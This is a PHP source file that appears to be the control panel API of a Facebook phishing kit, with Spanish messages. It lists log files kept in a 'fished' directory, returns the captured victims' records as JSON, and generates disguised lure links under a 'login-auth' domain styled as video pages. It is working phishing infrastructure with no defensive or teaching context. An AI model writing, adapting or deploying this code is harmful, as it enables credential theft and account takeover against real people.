<?php

header('Access-Control-Allow-Origin: *');

function findRegisters()
{
    $res = [];
    $array = array_slice(scandir('../../fished/'), 2);

    foreach ($array as $key => $value) {
        $array[$key] = str_replace('.txt', '', $value);
    }

    $res['status'] = 200;
    $res['message'] = 'Los registros han sido listados por fechas';
    $res['data'] = array_reverse($array);
    
    return $res;
}

function dataByRegister($fileName)
{
    $res = [];
    $filePath = '../../fished/' . $fileName . '.txt';
    if (file_exists($filePath)) {
        $data = file_get_contents($filePath);
        $array = explode('----', $data);
        foreach ($array as $key => $value) {
            $array[$key] = json_decode($value, true);
        }
        array_pop($array);

        $res['status'] = 200;
        $res['message'] = count($array) . ' usuario(s) listado(s)';
        $res['data'] = $array;
    } else {
        $res['status'] = 400;
        $res['message'] = 'No existen resgitros en ' . $fileName;
        $res['data'] = [];
    }
    return $res;
}
function generateURL($url){
    $res = [];
    if ($url){
        $urls = json_decode(file_get_contents('url.json'), true);
        $idURL = hash('CRC32',$url);
        $urls[$idURL] = $url;
        file_put_contents('url.json',json_encode($urls));
        if ($_SERVER['HTTP_HOST'] == 'localhost') {
            $urlGenerated = 'http://localhost/facebook/Dphishing/video/'.$idURL;
        }else{
            $urlGenerated = 'http://login-auth.epizy.com/video/'.$idURL;
        }
        $res['status'] = 200;
        $res['message'] = 'URL generada correctamente';
        $res['data'] = $urlGenerated;
    }else{
        $res['status'] = 400;
        $res['message'] = 'Ocurrio un error en la creacion de URL';
        $res['data'] = null;
    }
    return $res;
}
function nofunction()
{
    $res = [];
    $res['status'] = 400;
    $res['message'] = 'No hay suficientes parámetros';
    $res['data'] = [];
    return $res;
}

# Variables según POST
$function = !empty($_POST['function']) ? $_POST['function'] : null;
$data = !empty($_POST['data']) ? $_POST['data'] : null;

switch ($function) {
    case 'dataByRegister':
        $response = dataByRegister($data);
        break;
    case 'findRegisters':
        $response = findRegisters();
        break;
    case 'generateURL':
        $response = generateURL($data);
        break;
    default:
        $response = nofunction();
        break;
}

header('Content-type: application/json');
echo json_encode($response, JSON_PRETTY_PRINT);
